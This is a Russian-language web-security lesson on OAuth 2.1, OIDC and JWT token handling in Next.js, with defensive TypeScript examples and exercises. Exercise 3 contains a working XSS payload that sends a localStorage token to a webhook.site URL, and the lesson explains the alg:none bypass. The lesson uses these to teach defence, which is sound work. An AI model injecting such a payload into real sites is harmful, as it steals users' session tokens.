# A4.6.3 — OAuth, OIDC, JWT

## Зачем

Любое современное приложение рано или поздно интегрируется с внешней аутентификацией: «Войти через Google», SSO (Single Sign-On — единая точка входа) в корпоративный Okta, API-ключи для партнёров. За этим всем стоят три спецификации: OAuth (Open Authorization — открытый протокол авторизации), OIDC (OpenID Connect — слой идентификации поверх OAuth) и JWT (JSON Web Token — подписанный токен в формате JSON).

Разработчики путают их постоянно: «OAuth для логина» (нет, OAuth для авторизации, OIDC — для логина), «JWT безопаснее cookies» (нет, это ортогональные вещи), «access token в localStorage — удобно» (нет, это XSS-риск). Урок — про то, чем эти три штуки на самом деле занимаются и как их правильно использовать в Next.js-приложении.

## Главное

### OAuth 2.1 и нужные flow

OAuth 2.1 — ревизия OAuth 2.0, объединяющая best practices и выкидывающая опасные flows. Две версии в 2026 году практически сосуществуют, разница в том, что 2.1 делает обязательным PKCE (Proof Key for Code Exchange — доказательство владения ключом обмена) для публичных клиентов и убирает implicit flow.

Три актуальных flow:

- **Authorization Code + PKCE** — основной flow для SPA (Single Page Application), мобильных приложений и Next.js-приложений. Пользователь редиректится на провайдера, логинится, возвращается с `code` в URL, клиент обменивает `code` на токены. PKCE защищает от перехвата `code` на промежуточном шаге.
- **Client Credentials** — machine-to-machine (сервер к серверу), без пользователя. Бэкенд получает токен по `client_id` + `client_secret`, ходит в чужой API. Для фронта не применимо.
- **Device Code** — для устройств без браузера (TV, CLI). Редко нужен фронту, но полезно знать.

**Implicit flow deprecated** — он возвращал access token прямо в URL фрагменте, что приводило к утечкам через логи и history. В 2026 году его просто не используют.

### OIDC как слой идентификации поверх OAuth

OAuth отвечает на вопрос «какие действия разрешены клиенту?» (scope — область доступа). OIDC добавляет «кто этот пользователь?»: поверх OAuth flow провайдер возвращает `id_token` — JWT с claims (утверждениями) о пользователе.

Стандартные claims в id_token:

- `sub` (subject — субъект) — уникальный идентификатор пользователя у провайдера;
- `email`, `email_verified`;
- `name`, `given_name`, `family_name`, `picture`;
- `iss` (issuer — издатель) — кто выдал токен;
- `aud` (audience — получатель) — для какого клиента выдан;
- `exp` (expiration — истечение), `iat` (issued at — время выдачи).

`id_token` — для твоего приложения, чтобы понять, кто пришёл. `access_token` — для твоего приложения, чтобы ходить в API провайдера. Не путать.

### Где хранить токены

Это место, где фронтендеры регулярно совершают ошибки с последствиями.

- **access_token** — держи в памяти JavaScript (переменная в React state, closure). Да, при перезагрузке вкладки пропадает — это фича, не баг. `localStorage` — XSS-уязвимость: один `<script>` с чужим JS, и токен украден.
- **refresh_token** — в httpOnly Secure SameSite=Strict cookie. JavaScript его не видит, XSS не украдёт, cross-site запросы не прикладывают.
- **Альтернатива — refresh token rotation**: каждое обновление выдаёт новый refresh token, старый инвалидируется. Если токен украли — атакующий обновит один раз, легитимный клиент получит ошибку при следующей попытке, сервер поймёт компрометацию.

Ключевое правило: **access_token не должен переживать перезагрузку страницы в persistent storage**. При перезагрузке — запроси новый через refresh token.

### JWT: плюсы и минусы

JWT — формат токена: `header.payload.signature`, все три части — base64url (кодировка base64 с безопасными для URL символами). Сервер проверяет подпись, читает payload — и знает, что токену можно доверять без обращения в базу.

Плюсы:

- **Stateless (без состояния).** Сервер не хранит сессии, масштабируется горизонтально без липких сессий.
- **Переносимость.** Тот же токен работает на нескольких сервисах с общим секретом/ключом.

Минусы:

- **Нельзя отозвать** без revocation list (списка отозванных токенов). Если пользователь вышел из аккаунта, а токен действителен ещё 30 минут — либо держишь revocation list (превращая stateless обратно в stateful), либо короткий `exp` и refresh rotation.
- **Размер.** JWT — это ~500 байт против ~50 байт у session id. В каждом запросе.
- **Ошибки реализации.** Принять алгоритм `none`, не проверять `exp`, использовать слабый секрет — и безопасность рухнула.

### Важные JWT claims и алгоритмы

Обязательно проверять:

- `exp` — токен истёк? Отклонить.
- `iss` — ожидаемый издатель?
- `aud` — токен выписан для меня?
- `sub` — кто пользователь.
- `iat`, `nbf` (not before — не раньше) — валидно по времени?

Алгоритмы подписи:

- **RS256** (RSA + SHA-256) — асимметричный: приватный ключ подписывает у издателя, публичный ключ проверяет где угодно. Рекомендуется для OIDC — клиент забирает публичный ключ с JWKS endpoint провайдера.
- **HS256** (HMAC + SHA-256) — симметричный: один shared secret (общий секрет) для подписи и проверки. Подходит для монолита, где «кто подписывает» = «кто проверяет». Для межсервисной интеграции — нет.
- **`none`** — подписи нет. В старых библиотеках был баг: сервер принимал `alg: none` и не проверял подпись. Современные библиотеки блокируют, но проверить стоит: всегда явно указывай ожидаемый алгоритм при verify.

### BFF-паттерн — спрятать токены от фронта

BFF (Backend-for-Frontend — бэкенд, обслуживающий конкретный фронтенд) — архитектурный приём: между SPA и настоящим API ставится тонкий бэкенд, который хранит токены в session и общается с API от имени пользователя. Фронт работает только с session cookie (httpOnly, SameSite=Lax).

Плюсы:

- Токены не касаются браузера — XSS не украдёт.
- Можно использовать стандартные session cookies без JWT-сложности.
- Центральное место для refresh, rate limit, audit log.

Минусы:

- Лишний сервис в инфре.
- Stateful, нужно хранилище сессий.

В Next.js паттерн реализуется естественно: Route Handler или Server Action получает токены через OAuth flow, сохраняет их в шифрованной session cookie через `cookies().set()`, клиентские компоненты ходят только в свой же бэкенд.

### Готовые решения

- **Auth.js / NextAuth** — де-факто стандарт для Next.js. Поддерживает OIDC-провайдеры, email, credentials. Встроенный BFF-режим. В 2026 актуальная версия — v5.
- **Clerk** — managed (управляемое) решение, UI из коробки, SSO, организации. Платный, но экономит месяцы работы.
- **WorkOS** — фокус на B2B и enterprise SSO.
- **Keycloak / Ory** — self-hosted (самостоятельно развёрнутые) для корпораций.

Не писать свой auth-сервер. Реально.

## Пример кода

### Хранение access token в памяти, refresh в cookie

```ts
// lib/auth-client.ts — клиентская сторона
let accessToken: string | null = null;

export function setAccessToken(token: string | null) {
  accessToken = token;
}

export async function authorizedFetch(url: string, init: RequestInit = {}) {
  if (!accessToken) await refreshAccessToken();

  const headers = new Headers(init.headers);
  headers.set('Authorization', `Bearer ${accessToken}`);

  const res = await fetch(url, { ...init, headers });
  if (res.status !== 401) return res;

  // Access истёк — обновить и повторить один раз
  await refreshAccessToken();
  headers.set('Authorization', `Bearer ${accessToken}`);
  return fetch(url, { ...init, headers });
}

async function refreshAccessToken() {
  const res = await fetch('/api/auth/refresh', { method: 'POST', credentials: 'include' });
  if (!res.ok) {
    accessToken = null;
    window.location.href = '/login';
    return;
  }
  const { access_token } = await res.json();
  accessToken = access_token;
}
```

### Refresh endpoint с httpOnly cookie

```ts
// app/api/auth/refresh/route.ts
import { cookies } from 'next/headers';
import { NextResponse } from 'next/server';

export async function POST() {
  const cookieStore = await cookies();
  const refresh = cookieStore.get('refresh_token')?.value;
  if (!refresh) return NextResponse.json({ error: 'no refresh' }, { status: 401 });

  const res = await fetch('https://auth.example.com/oauth/token', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({
      grant_type: 'refresh_token',
      refresh_token: refresh,
      client_id: process.env.OAUTH_CLIENT_ID!,
    }),
  });

  if (!res.ok) return NextResponse.json({ error: 'refresh failed' }, { status: 401 });
  const tokens = (await res.json()) as {
    access_token: string;
    refresh_token: string;
    expires_in: number;
  };

  // Refresh rotation — новый токен перезаписывает старый
  cookieStore.set('refresh_token', tokens.refresh_token, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    path: '/api/auth',
    maxAge: 60 * 60 * 24 * 30,
  });

  return NextResponse.json({ access_token: tokens.access_token, expires_in: tokens.expires_in });
}
```

### Проверка JWT на сервере

```ts
// lib/verify-jwt.ts
import { jwtVerify, createRemoteJWKSet } from 'jose';

const JWKS = createRemoteJWKSet(new URL('https://auth.example.com/.well-known/jwks.json'));

export async function verifyAccessToken(token: string) {
  const { payload } = await jwtVerify(token, JWKS, {
    issuer: 'https://auth.example.com',
    audience: 'https://api.example.com',
    algorithms: ['RS256'], // явный whitelist алгоритмов — никакого none
  });
  // payload.exp проверен библиотекой автоматически
  return payload;
}
```

## Частые ошибки

1. **Access token в `localStorage`.** Один XSS — и атакующий получает авторизованный доступ ко всем API. Держи access в памяти, refresh в httpOnly cookie.

2. **JWT без `exp` или с огромным expiry.** «Токен на год, чтобы пользователь не перелогинивался» — значит украденный токен действует год. Короткий `exp` (15 минут) + refresh rotation — индустриальный стандарт.

3. **Принимать алгоритм `none` или не указывать whitelist алгоритмов при verify.** Классическая уязвимость: атакующий меняет header на `{alg: 'none'}`, убирает подпись, сервер принимает. Всегда явно: `algorithms: ['RS256']`.

4. **Верить `exp` без проверки подписи.** `jwt.decode` != `jwt.verify`. Decode только читает payload, не проверяя, что он вообще от доверенного издателя. Всегда verify.

5. **Implicit flow для SPA в новом коде.** Deprecated с 2021 года. Authorization Code + PKCE — единственный правильный выбор.

6. **Писать свой OAuth-сервер.** Провайдеров — десятки готовых. Auth.js, Clerk, WorkOS, Keycloak закрывают почти все use case. Свой auth — это годы работы и гарантированные уязвимости.

## Задания

### 1. Сравнить flow на практике

Возьми любой SaaS (GitHub, Google, Auth0) и пройди Authorization Code + PKCE flow руками: открой URL `/authorize?...`, залогинься, получи `code` в redirect URL, обменяй его на токены через `curl`. Посмотри в ответ на поля `access_token`, `refresh_token`, `id_token`. Раскодируй id_token на jwt.io (не на проде, не с секретами) — увидишь claims.

### 2. Настроить Auth.js в Next.js-проекте

Подключи Auth.js v5 с провайдером Google. Разбери, как библиотека хранит session: cookie name, flags, где лежат токены. Проверь, что access token не доступен в `document.cookie`.

### 3. Поймать XSS-эксплуатацию localStorage

В тестовом приложении (не на проде) сохрани access token в `localStorage`. Добавь `dangerouslySetInnerHTML` с payload `<img src=x onerror="fetch('https://webhook.site/...?t='+localStorage.getItem('token'))">`. Убедись, что атака работает. Потом перенеси токен в httpOnly cookie — повтори попытку, увидь, что JS уже не имеет доступа.

### 4. Реализовать BFF вручную

Напиши в Next.js Route Handler endpoints `/api/auth/callback`, `/api/auth/refresh`, `/api/auth/logout` без NextAuth. Токены храни в шифрованной session cookie (используй `jose` или `iron-session`). Сравни с NextAuth — объём кода, edge cases, какие детали ты забыл.
